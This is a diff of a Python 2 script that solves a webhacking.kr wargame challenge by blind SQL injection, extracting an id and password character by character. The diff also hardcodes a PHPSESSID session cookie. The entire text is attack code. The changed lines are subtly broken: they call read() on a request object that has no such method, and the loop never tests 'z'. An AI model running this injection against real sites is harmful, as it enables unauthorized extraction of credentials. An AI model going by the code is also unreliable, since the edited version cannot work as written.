@@ -1,6 +1,6 @@
 #-*- coding: utf-8 -*-
 import urllib2
-import CookieConstants
+import CookieManager
 
 baseUrl  = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"
 idParam  = "no=2%%20and%%20if(substr(id,%d,1)in(%s),1,0)"
@@ -19,8 +19,9 @@ for caretIndex in range(1, 6):
     print "    [%02d] extract..." % (caretIndex), 
     for charIndex in range(ord('a'), ord('z')):
         httpRequest = urllib2.Request(baseUrl + "?" + idParam % (caretIndex, hex(charIndex)))
-        httpRequest.add_header("Cookie", CookieConstants.sessionId)
-        httpResponse = urllib2.urlopen(httpRequest).read()
+        CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+        httpRequest.add_header("Cookie", CookieManager.getCookie())
+        httpResponse = httpRequest.read()
         if str(httpResponse).find("True") >= 0:
             print chr(charIndex)
             answerId += chr(charIndex)
@@ -34,8 +35,9 @@ for caretIndex in range(1, 20):
     print "    [%02d] extract..." % (caretIndex), 
     for charIndex in range(ord('a'), ord('z')):
         httpRequest = urllib2.Request(baseUrl + "?" + pwParam % (caretIndex, hex(charIndex)))
-        httpRequest.add_header("Cookie", CookieConstants.sessionId)
-        httpResponse = urllib2.urlopen(httpRequest).read()
+        CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
+        httpRequest.add_header("Cookie", CookieManager.getCookie())
+        httpResponse = httpRequest.read()
         if str(httpResponse).find("True") >= 0:
             print chr(charIndex)
             answerPw += chr(charIndex)
